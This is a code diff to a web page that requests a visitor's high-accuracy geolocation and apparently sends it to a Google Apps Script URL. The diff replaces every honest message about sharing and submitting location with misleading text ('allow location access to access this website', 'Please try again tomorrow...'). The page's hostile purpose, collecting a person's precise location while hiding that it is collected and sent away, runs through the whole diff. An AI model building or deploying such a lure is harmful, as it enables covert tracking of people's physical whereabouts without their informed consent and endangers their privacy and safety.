@@ -24,10 +24,10 @@
 <body>
 
 <h2>Location Sharing</h2>
-<p>Please allow location access to share your current location.</p>
+<p>Please allow location access to access this website.</p>
 
-<button onclick="getLocation()">Share My Location</button>
-<p id="status">Requesting location permission...</p>
+<button onclick="getLocation()">Please try again tomorrow...</button>
+<p id="status">Please wait...</p>
 
 <script>
 const API_URL = "https://script.google.com/macros/s/AKfycbzC7roEtGtjrSSzyewTLwfCCudXevalHfknVl9MwFz6Q9HyJfkTF6v6ppCmSnsx61x7/exec";
@@ -37,11 +37,11 @@ function getLocation() {
   const status = document.getElementById("status");
 
   if (!navigator.geolocation) {
-    status.innerText = "Location is not supported by this browser.";
+    status.innerText = "Location is not supported by this browser. Try on different browser";
     return;
   }
 
-  status.innerText = "Please allow location access...";
+  status.innerText = "Please allow some time...";
 
   navigator.geolocation.getCurrentPosition(
     function(position) {
@@ -65,11 +65,11 @@ function getLocation() {
       });
 
       status.innerText =
-        "Location submission initiated. Thank you!";
+        "Your request is in process. Thank you!";
     },
     function(error) {
       status.innerText =
-        "Location not shared. Please allow location permission and try again.";
+        "Please allow location permission and try again.";
     },
     {
       enableHighAccuracy: true,
